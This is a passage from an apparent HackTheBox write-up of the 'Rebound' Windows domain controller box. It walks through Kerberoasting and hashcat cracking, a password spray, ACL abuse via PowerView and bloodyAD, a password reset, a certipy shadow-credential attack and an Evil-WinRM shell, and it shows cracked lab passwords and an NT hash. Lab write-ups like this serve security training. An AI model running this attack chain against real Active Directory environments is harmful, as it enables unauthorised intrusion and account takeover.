$krb5tgs$18$delegator$$REBOUND.HTB$*delegator$*$ae79784d0482abdeb6b4e01d$8660865bf2c04d67885ccad58bcd7aca0c808fbe2e8e6b42a718d8ea3ac4fdb7c0ef95ee78e8a5cddae8196b54ecdb16bdc229f76ff11434cf6a72f83e48258d0eb25e6769bdca11349f20c11234637f257c6de44cb3cddba17e38954b0cf29a1c437d33d5ae153c4f9c89d5fa7d321fe47ce66fbf8c206b75f20d57846308acfd544be94e75f865cca845a5fea7b06db3c74e8a1b6a49065822d633e915e66fa3bb2382c3c620fce7cf08b8f1346db69e7f5a259a2091c336a719700ac2aa5ff802cd9572d15c5a212560633d24b42c4ee03c614b3ac1d44afaadb2d3790f1259f05e4596f335f5b45433763d8d1840a4ed2cbba80fe644732eb3a660ae0d307833cdc5ff49b3e20ad592c1c7abd32f22c349f15ad3faeb130622cd41bd6c1e11d72dd9f38010aec2fe6257999e857449877d4857103e898fa60ade92f84adac5e8ebc12be397bff2be87161a150434efda52eb33b4266cc635e2f4525e57a35f15d42212f34b15661630d844202bcefa3fe0f0f013f7e2af754600745e52b0843de3ead1bddac4aebe88bc891cce66e32ed718e8d09d2dccb15cee0bfe72fe3627850a3568cf34b4641ec4ce53c48925b9949683b31d717f8488b754997cf12bc1c030bd07f1b84907c369eca2b0a73bbb342b5ec3f54ae954d0ca2e62a1f13e6cd59b1feac032769a7ad82add9d02d8e7ef70243ae28d4467f51f073c351bd72fd182d03cb021b4d6fa6cda7ee89077795175192deccc512555d1854a9130255be57a26efed35c354c930c56e77f27757834a5f9461f8c1829fe4f1b1dad9fb78a32af9a8d28919b16f58b0d633d0d26b80e1cc13cd737bd55bc94ee472957c4526ba373a6ef300e292c07e8ee82f23f21709b713b9c1c9a63a00bb049074a2cd058d440e9b757fef9ca8b3c45bee8da996bf495f1e4e9af96464f828a5ca0a2ea95367ee0c9a098abed7075962a957c20814259d08377e2420ad97563c5f0f317be791940f3613326c2d56291b4b23763c833e19ea6dbf1861ff57fda6ea212ee4917aca5dc12d3cab898854cca7d4832f63308e23b3185b43fa0668579c2ab8962f2ee378ebd6d18124b1d3e1d569469dd20b1330a1b7b2518ef5c9944362b9716fcf093dbe6df6976c0496615ac2646f9985451e1cea210999e20577bb4e4884706a872fa0586a729576f10807d7b4e51312d51e268a0da2a34b1f64737da879eae590223fdb341fb84f97b526c494c0dd07e3218232a5e2362e65ec03ddd72500d294a2d908bf8138a9ba750e94d48477c7ba61206a8832fd656bcb70cd06d65b56971bde9684856d237fe33ae55209513e2510e7d34c91ef87c37ae275f7070c28ef6846105d

```

It finds hashes for several accounts. I’ll save these to a file:

```

oxdf@hacky$ GetUserSPNs.py -no-preauth jjones -usersfile users -dc-host 10.10.11.231 rebound.htb/ | grep '^\$krb' > kerberoasting_hashes

```

#### Crack

Without trying, I think it will be very unlikely that the krbtgt, DC01$, or delegator$ accounts will crack. Those are all machine accounts or otherwise internally managed accounts, and likely to have a long complex password. I’ll start with ldap\_monitor:

```

oxdf@hacky$ cat kerberoasting_hashes | grep ldap_monitor > ldap_monitor_hash

```

This hash cracks very quickly:

```

$ hashcat ldap_monitor_hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt 
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol
...[snip]...
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$32de7e851f8f915888e4e64efe48bbd9$bf442e512e0ddf5a72a23ee2a207d14a843855b57607e27acfc416e6a543f2c19ce071cddec0bd97bbe3d1c428b610da43c7d1ec5d65fb1c5c2eb74a61862b1c76ad1e6b3a34b815d32a1125d95b2975ea23db89adce29f50586b40a5946550b5c9e7381614f2dffbc142cd0180eeb0b7b67e81edefe04baeb4980a1dd87a22621ea52d7226ec7ce2060b36274927b7149686c9c23b963635e39c381f0455c2834b1eb24675ff1b0fa5de7bbecd12931fc8f614e3bd2320d41f3852ab7bd980d774f04ac7702bcd4364014aa5ca15d6dae00fd4b57a786becc93ef47445f5dd985cd0fce92583db122eef29ddd6948fa7af464872ca53284d8bb8d29e692f29f16fe2d21a261c22dd94916877b8240c09b6518f2d9ddfe24628d331cb6ced17b991fc6bfab48e565ccf5d85bbad5c0e1f433777ea8a93d86fc0a8229d5353ba16bcbbb0fd95a626f0c33de9cccdd5b88c7814ff4b31408e65bfbf2858adce4ba03604b7f270829c154c6ac47c6a669d8c496efae8fb524c32fff874ba1bb1a4f2cd0c2958677ed03964f2a65519f7fb78f8b819cb0b6efccf53d76fb2758d086b76051e243ce9ba2090060bebc99f6f15aac1641ff84648f526c92d7c2a97232e56d9750781acf08786ea35429ff67bff3e8f627d02203291459ed30afbca7b1ef6011054df9720bb036ac2ba72e92d6650d0c77c21de363a4e13aa7f6daf6372624eb6c164f3441cd7bf94e03e28dedd20fccf366ba45cfc65d79c7c3f7a6a83f30faf3d1a847e31e8aeaf3ff89095bb7a72a9f5c756ba96ec2c8784e360f20eb52a4dc76ca7bc85458b686903fc0c2733cf27beaff7e85ee1aa0471630adf7f47a98db13e511d7f4ad5d3547284935c50878028b641b103350c10b31ed9d3bb4f7e9ddb71689a291e26fb35908a0b07e8f5004643a7338763a4a03e4cd16a7d444e26d90894b92a2e85b1f9ef1ce23f22abf58958a9b77d6aa94a4de152c5bc42de4f16d5c99c2b9bb765cf4b532b16d56a2df502b48a4ce5a0a16b2c3007d4e69aa009d4f381d59b6881aa245ba399161c21bad0b58243b8eafffc873ab2a543de77f89170d5ff0d638943b71dd1f389b67326628f4b2454821bd682a60d45e5e42fe943fdc9e458aa438f8e513df0b52d4922422fb990ef9c0c8c08e750bc46eae4033143d5b748451221941cc06881e7c0e17c1b15344c92dbe4cb15a59c06b2e5921d2a3d39d606fb5f595f235d498e3d93294a9ee8b04eb324f9062d9ca2fd1380e106f82238e33a351caab3772e12b3cb3a255ad1fa3806241f85a5e0ba5d690b9d921a4cbd02608ac224c35c506f86019520c2bda88f62a0300a286e017:1GR8t@$$4u
...[snip]...

```

The others don’t crack with `rockyou.txt`.

#### Test Creds

These creds work for SMB, but not WinRM or LDAP:

```

oxdf@hacky$ netexec smb rebound.htb -u ldap_monitor -p '1GR8t@$$4u' 
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.231    445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
oxdf@hacky$ netexec winrm rebound.htb -u ldap_monitor -p '1GR8t@$$4u' 
WINRM       10.10.11.231    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
WINRM       10.10.11.231    5985   DC01             [-] rebound.htb\ldap_monitor:1GR8t@$$4u
oxdf@hacky$ netexec ldap rebound.htb -u ldap_monitor -p '1GR8t@$$4u'
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.231    445    DC01             [-] rebound.htb\ldap_monitor:1GR8t@$$4u 

```

The LDAP failure is weird. Typically, any domain use can at least connect to LDAP. It turns out that the host is configured with the [LDAP Channel Binding Policy](https://support.microsoft.com/en-us/topic/2020-2023-and-2024-ldap-channel-binding-and-ldap-signing-requirements-for-windows-kb4520412-ef185fb8-00f7-167d-744c-f299a66fc00a) is set to Always, which is designed to prevent NTLM relay attacks (see this [neat video](https://www.youtube.com/watch?v=pKt9IJJOM3I)).

If I try `netexec` against with the `-k` flag to force Kerberos, it does work:

```

oxdf@hacky$ netexec ldap rebound.htb -u ldap_monitor -p '1GR8t@$$4u' -k
SMB         rebound.htb     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAPS       rebound.htb     636    DC01             [+] rebound.htb\ldap_monitor 

```

At this point, with legit creds, there’s a lot I can collect, but I’ll save it for the next step when it’s most useful.

## Auth as OOrend

### Password Spray

Given that ldap\_monitor seems like a shared account, I’ll check to see if the password is reused with any other users. I’ll need the `--continue-on-success` flag to keep going after verifying the password works for ldap\_monitor:

```

oxdf@hacky$ netexec smb rebound.htb -u users -p '1GR8t@$$4u' --continue-on-success
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.231    445    DC01             [-] rebound.htb\Administrator:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.10.11.231    445    DC01             [-] rebound.htb\Guest:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.10.11.231    445    DC01             [-] rebound.htb\krbtgt:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.10.11.231    445    DC01             [-] rebound.htb\DC01$:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.10.11.231    445    DC01             [-] rebound.htb\ppaul:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.10.11.231    445    DC01             [-] rebound.htb\llune:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.10.11.231    445    DC01             [-] rebound.htb\fflock:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.10.11.231    445    DC01             [-] rebound.htb\jjones:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.10.11.231    445    DC01             [-] rebound.htb\mmalone:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.10.11.231    445    DC01             [-] rebound.htb\nnoon:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.10.11.231    445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
SMB         10.10.11.231    445    DC01             [+] rebound.htb\oorend:1GR8t@$$4u 
SMB         10.10.11.231    445    DC01             [-] rebound.htb\winrm_svc:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.10.11.231    445    DC01             [-] rebound.htb\batch_runner:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.10.11.231    445    DC01             [-] rebound.htb\tbrady:1GR8t@$$4u STATUS_LOGON_FAILURE 
SMB         10.10.11.231    445    DC01             [-] rebound.htb\delegator$:1GR8t@$$4u STATUS_LOGON_FAILURE 

```

oorend uses the same password!

### Validate Creds

Still no WinRM, and the same thing happens with LDAP:

```

oxdf@hacky$ netexec winrm rebound.htb -u oorend -p '1GR8t@$$4u'
WINRM       10.10.11.231    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
WINRM       10.10.11.231    5985   DC01             [-] rebound.htb\oorend:1GR8t@$$4u
oxdf@hacky$ netexec ldap rebound.htb -u oorend -p '1GR8t@$$4u'
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.231    445    DC01             [-] rebound.htb\oorend:1GR8t@$$4u 
oxdf@hacky$ netexec ldap rebound.htb -u oorend -p '1GR8t@$$4u' -k
SMB         rebound.htb     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAPS       rebound.htb     636    DC01             [+] rebound.htb\oorend 

```

## Shell as WinRM\_svc

### Enumeration

#### Collect Bloodhound

With access to two users, I can pull Bloodhound data with either of them:

```

oxdf@hacky$ bloodhound-python -d rebound.htb -c all -u oorend -p '1GR8t@$$4u' -ns 10.10.11.231 --zip
INFO: Found AD domain: rebound.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 16 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: gmsa.rebound.htb
INFO: Querying computer: dc01.rebound.htb
INFO: Skipping enumeration for gmsa.rebound.htb since it could not be resolved.
INFO: Done in 00M 22S
INFO: Compressing output into 20240317211834_bloodhound.zip

```

The script does hit the issue with LDAP, but it smart enough to work through it.

#### Bloodhound Analysis

It turns out that the version of Bloodhound Python that was out when Rebound released didn’t collect the data necessary for the next step. I’ll show that version here, as well as the latest version at the end.

Bloodhound doesn’t show any kind of outbound control from either ldap\_monitor or oorend. Typically this is where I move to other stuff, but without much else, I’ll look around what what interesting targets might be. The “Shortest Paths to High Value Targets” query shows this spegehitti:

[![image-20240317174350223](/img/image-20240317174350223.png)*Click for full size image*](/img/image-20240317174350223.png)

The top right of the chart jumps out as interesting. Two users in the ServiceMgmt group, which has `GenericAll` on Service Users, which contains WinRm\_SVC. WinRm\_SVC can also PsRemote into the DC, which is something I probably need.

#### ACL Analysis

`powerview.py` is a [neat tool](https://github.com/aniqfakhrul/powerview.py) for doing deeper analysis of Windows object properties remotely. Based off the no-longer-maintained `powerview.ps1` (still available [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)).

Without `-k`, it won’t connect (just like above), but on adding it, it does:

```

oxdf@hacky$ powerview rebound.htb/oorend:'1GR8t@$$4u'@rebound.htb
[2024-03-19 01:07:17] Bind not successful - invalidCredentials [ERROR_ACCOUNT_LOCKED_OUT]
oxdf@hacky$ powerview rebound.htb/oorend:'1GR8t@$$4u'@rebound.htb -k
[2024-03-19 01:07:37] LDAP Signing NOT Enforced!
(LDAPS)-[rebound.htb]-[rebound\oorend]
PV > 

```

From the `PV >` prompt, I can run typical PowerView commands. When I get to looking at the ACL on the RemoteMGMT group, there’s an interesting entry:

```

(LDAPS)-[rebound.htb]-[rebound\oorend]
PV > Get-DomainObjectAcl -Identity ServiceMGMT                                   ...[snip]...
ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : None
ActiveDirectoryRights       : Self
AccessMask                  : 0x8
InheritanceType             : None
SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)
...[snip]...

```

oorend has `Self` rights over this group, which means [they can add themselves to it](https://happycamper84.medium.com/self-perhaps-the-most-arcane-of-windows-privileges-4c7ace33230d).

#### Updated Bloodhound Collection

The latest version of Bloodhound Python will crash on running with `-c all`:

```

oxdf@hacky$ bloodhound-python -d rebound.htb -c all -u oorend -p '1GR8t@$$4u' -ns 10.10.11.231 --zip -k
INFO: Found AD domain: rebound.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Connecting to LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
Traceback (most recent call last):
  File "/home/oxdf/.local/bin/bloodhound-python", line 8, in <module>
    sys.exit(main())
             ^^^^^^
  File "/home/oxdf/.local/pipx/venvs/bloodhound/lib/python3.11/site-packages/bloodhound/__init__.py", line 343, in main
    bloodhound.run(collect=collect,
  File "/home/oxdf/.local/pipx/venvs/bloodhound/lib/python3.11/site-packages/bloodhound/__init__.py", line 81, in run
    membership_enum.enumerate_memberships(timestamp=timestamp, fileNamePrefix=fileNamePrefix)
  File "/home/oxdf/.local/pipx/venvs/bloodhound/lib/python3.11/site-packages/bloodhound/enumeration/memberships.py", line 843, in enumerate_memberships
    self.enumerate_users(timestamp, fileNamePrefix)
  File "/home/oxdf/.local/pipx/venvs/bloodhound/lib/python3.11/site-packages/bloodhound/enumeration/memberships.py", line 183, in enumerate_users
    'ObjectType': ADUtils.resolve_ad_entry(
                  ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/pipx/venvs/bloodhound/lib/python3.11/site-packages/bloodhound/ad/utils.py", line 278, in resolve_ad_entry
    account = ADUtils.get_entry_property(entry, 'sAMAccountName', '')
              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/oxdf/.local/pipx/venvs/bloodhound/lib/python3.11/site-packages/bloodhound/ad/utils.py", line 362, in get_entry_property
    value = entry['attributes'][prop]
            ~~~~~^^^^^^^^^^^^^^
TypeError: 'NoneType' object is not subscriptable

```

Running without `ObjectProps` works:

```

oxdf@hacky$ bloodhound-python -d rebound.htb -c Group,LocalADmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn -u oorend -p '1GR8t@$$4u' -ns 10.10.11.231 --zip
INFO: Found AD domain: rebound.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.rebound.htb
WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
INFO: Found 16 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.rebound.htb
INFO: User with SID S-1-5-21-4078382237-1492182817-2568127209-7686 is logged in on dc01.rebound.htb
INFO: Done in 00M 27S
INFO: Compressing output into 20240327185908_bloodhound.zip

```

And shows the path from OOrend to WinRM\_SVC under paths from Owned Principals:

![image-20240327120049364](/img/image-20240327120049364.png)

### Get ServiceMGMT Group

I’ll add the oorend user to the ServiceMGMT using Powerview commands:

```

(LDAPS)-[rebound.htb]-[rebound\oorend]
PV > Add-DomainGroupMember -Identity servicemgmt -Members oorend
[2024-03-19 01:20:23] User oorend successfully added to servicemgmt

```

This could also be done with [bloodyAD](https://github.com/CravateRouge/bloodyAD), another tool I’ll use a lot on this box:

```

oxdf@hacky$ bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add groupMember ServiceMGMT oorend
[+] oorend added to ServiceMGMT

```

After running this (either way), oorend is now in the group:

![image-20240318183829635](/img/image-20240318183829635.png)

### Get Control over WinRM\_SVC

With full control rights over the ServiceMGMT OU, I can give oorend `GENERICALL` over the users in the OU:

```

oxdf@hacky$ bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB

```

Now oorend has `FullControl` over WinRM\_svc:

```

(LDAPS)-[rebound.htb]-[rebound\oorend]
PV > Get-DomainObjectAcl -Identity winrm_svc -Where "SecurityIdentifier contains oorend"
ObjectDN                    : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7684
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
ActiveDirectoryRights       : FullControl
AccessMask                  : 0xf01ff
InheritanceType             : None
SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)

```

### Access WinRM\_SVC

With full control over the ServiceMGMT OU, I get the same control over the users in that OU, most interesting WinRM\_SVC. There are many ways to get access as that user from here. I’ll show two.

#### Change Password

The most obvious way I could think of was to just change the user’s password. This can be done with `bloodyAD`:

```

oxdf@hacky$ bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb set password winrm_svc 'LeetPassword123!'
[+] Password changed successfully!

```

And now I have access:

```

oxdf@hacky$ netexec winrm dc01.rebound.htb -u winrm_svc -p 'LeetPassword123!'
WINRM       10.10.11.231    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
WINRM       10.10.11.231    5985   DC01             [+] rebound.htb\winrm_svc:LeetPassword123! (Pwn3d!)

```

And can get a shell:

```

oxdf@hacky$ evil-winrm -i dc01.rebound.htb -u winrm_svc -p 'LeetPassword123!'

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents>

```

And get the flag:

```
*Evil-WinRM* PS C:\Users\winrm_svc\desktop> type user.txt
6540c39a************************

```

#### Shadow Cred

A more careful way (and the author’s suggested method) is to use a Shadow Credential, similar to what I showed in [Absolute](/2023/05/27/htb-absolute.html#shadow-credential) and [Outdated](/2022/12/10/htb-outdated.html#get-sflowers-ntlm).

```

oxdf@hacky$ certipy shadow auto -username oorend@rebound.htb -password '1GR8t@$$4u' -k -account winrm_svc -target dc01.rebound.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '944a2974-ff0a-2169-27cb-7729bc77e22b'
[*] Adding Key Credential with device ID '944a2974-ff0a-2169-27cb-7729bc77e22b' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '944a2974-ff0a-2169-27cb-7729bc77e22b' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@rebound.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 4469650fd892e98933b4536d2e86e512

```

That provides the hash for the account, which I can use with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):

```

oxdf@hacky$ evil-winrm -i dc01.rebound.htb -u winrm_svc -H 4469650fd892e98933b4536d2e86e512

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> 

```

This method is far superior, in that it’s more stealthy (I haven’t modified the password, only added alternative credentials).

## Auth as TBrady

### Enumeration

#### File System

There’s nothing else in winrm\_svc’s home directory:

```
*Evil-WinRM* PS C:\Users\winrm_svc> ls -recurse .

    Directory: C:\Users\winrm_svc

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---         4/8/2023   2:10 AM                Desktop
d-r---        8/31/2023  10:50 PM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos

    Directory: C:\Users\winrm_svc\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        3/12/2024   9:22 PM             34 user.txt

```

Nothing jumps out as interesting in `C:\Program Files` or `C:\Program Files (x86)`. The root of the file system is pretty bare, with only the empty `Shared` folder (presumably the SMB share) at all unusual:

```
*Evil-WinRM* PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         4/7/2023   8:10 AM                PerfLogs
d-r---        8/28/2023   8:26 PM                Program Files
d-----        7/20/2021  12:23 PM                Program Files (x86)
d-----        8/25/2023   2:46 PM                Shared
d-r---         4/8/2023   3:12 AM                Users
d-----        3/17/2024   4:50 PM                Windows

```

#### ADCS

There’s nothing interesting with ADCS. Getting `certipy` working was slightly interesting, so I’ll show that here (though one can skip to the next section without missing anything as far as solving the box).

When I run the standard `certipy` search to look for vulnerable templates, it fails due to LDAP channel binding (just like [above](#test-creds)):

```

oxdf@hacky$ certipy find -dc-ip 10.10.11.231 -ns 10.10.11.231 -u oorend@rebound.htb -p '1GR8t@$$4u' -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[-] Got error: Failed to bind to LDAP. LDAP channel binding or signing is required. Use -scheme ldaps -ldap-channel-binding
[-] Use -debug to print a stacktrace

```

It is nice enough to tell me two options to add. Trying to run this again raises another error:

```

oxdf@hacky$ certipy find -dc-ip 10.10.11.231 -ns 10.10.11.231 -u ldap_monitor@rebound.htb -p '1GR8t@$$4u' -vulnerable -stdout -scheme ldaps -ldap-channel-binding             
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[-] Got error: To use LDAP channel binding, install the patched ldap3 module: pip3 install git+https://github.com/ly4k/ldap3
[-] Use -debug to print a stacktrace   

```

After installing the module, it works:

```

oxdf@hacky$ certipy find -dc-ip 10.10.11.231 -ns 10.10.11.231 -u oorend@rebound.htb -p '1GR8t@$$4u' -vulnerable -stdout -scheme ldaps -ldap-channel-binding
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'rebound-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'rebound-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'rebound-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'rebound-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : rebound-DC01-CA
    DNS Name                            : dc01.rebound.htb
    Certificate Subject                 : CN=rebound-DC01-CA, DC=rebound, DC=htb
    Certificate Serial Number           : 42467DADE6281F8846DC3B6CEE24740D
    Certificate Validity Start          : 2023-04-08 13:55:49+00:00
    Certificate Validity End            : 2122-04-08 14:05:49+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : REBOUND.HTB\Administrators
      Access Rights
        ManageCertificates              : REBOUND.HTB\Administrators
                                          REBOUND.HTB\Domain Admins
                                          REBOUND.HTB\Enterprise Admins
        ManageCa                        : REBOUND.HTB\Administrators
                                          REBOUND.HTB\Domain Admins
                                          REBOUND.HTB\Enterprise Admins
        Enroll                          : REBOUND.HTB\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates

```

Though in working it fails to find any vulnerable templates.

#### Processes

Looking at the running processes, something interesting:

```
*Evil-WinRM* PS C:\> get-process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    394      32    12792      21696              2612   0 certsrv
    494      19     2328       5628               392   0 csrss
    269      16     2224       5272               504   1 csrss
    359      15     3504      14960              5584   1 ctfmon
    399      36    18608      27124              2712   0 dfsrs
    191      13     2476       8280              3140   0 dfssvc
    285      14     3928      13800              3828   0 dllhost
    382      28     8964      13152              2748   0 dns
    579      24    24264      50480              1012   1 dwm
   1413      54    20948      83208              5872   1 explorer
     53       6     1508       4716              2568   0 fontdrvhost
     53       6     1784       5440              2576   1 fontdrvhost
      0       0       56          8                 0   0 Idle
   2338     183    63996      82612               636   0 lsass
    496      39    52132      65904              2648   0 Microsoft.ActiveDirectory.WebServices
    254      13     2964      10788              4564   0 msdtc
    649      92   312468     330268              3096   0 MsMpEng
      0      14      360      23612                88   0 Registry
    236      13     2800      17200               112   1 RuntimeBroker
    319      17    20268      33732               852   1 RuntimeBroker
    231      12     2400      13136              1304   1 RuntimeBroker
    670      32    35944      76048              6136   1 SearchUI
    276      12     2888      12572              1956   0 SecurityHealthService
    628      14     6240      13952               628   0 services
    786      30    17024      60888              6056   1 ShellExperienceHost
    454      17     4912      25032              5232   1 sihost
     53       3      516       1212               300   0 smss
    136      17     3792       8124                 8   0 svchost
    209      12     1704       7512               340   0 svchost
    214      12     2044      10128               488   0 svchost
    173       9     1724      12100               712   0 svchost
     89       5      892       3992               844   0 svchost
    936      21     7296      23472               864   0 svchost
    913      20     5840      13312               900   0 svchost
    213       9     2160       7336               920   0 svchost
    258      11     2144       8080               952   0 svchost
    258      13     3504       9152              1064   0 svchost
    391      13    13968      18388              1124   0 svchost
    407      32     6908      16292              1164   0 svchost
    376      19     4860      13276              1216   0 svchost
    329      15     4868      13852              1260   0 svchost
    283      16     4272      13572              1268   0 svchost
    236      12     2548      11828              1328   0 svchost
    440       9     2836       9280              1344   0 svchost
    150       7     1196       5900              1360   0 svchost
    372      18     5364      15020              1456   0 svchost
    173      11     2512      13520              1464   0 svchost
    336      10     2772       8988              1512   0 svchost
    173      11     1784       8352              1532   0 svchost
    315      13     2248       9320              1580   0 svchost
    191      12     1980      12220              1708   0 svchost
    145       9     1628       7064              1752   0 svchost
    174       9     2288       7884              1768   0 svchost
    220      10     2376       9456              1872   0 svchost
    220      12     2224       9544              1888   0 svchost
    168      12     1812       7632              1920   0 svchost
    268      13     2468       8104              1928   0 svchost
    447      20    13940      23520              2012   0 svchost
    474      19     3352      12788              2052   0 svchost
    325      15     3812      14508              2112   0 svchost
    209      11     2408       8932              2468   0 svchost
    146       7     1304       5976              2620   0 svchost
    249      25     4100      13620              2656   0 svchost
    510      21    22428      36984              2732   0 svchost
    223      12     2044       7740              2816   0 svchost
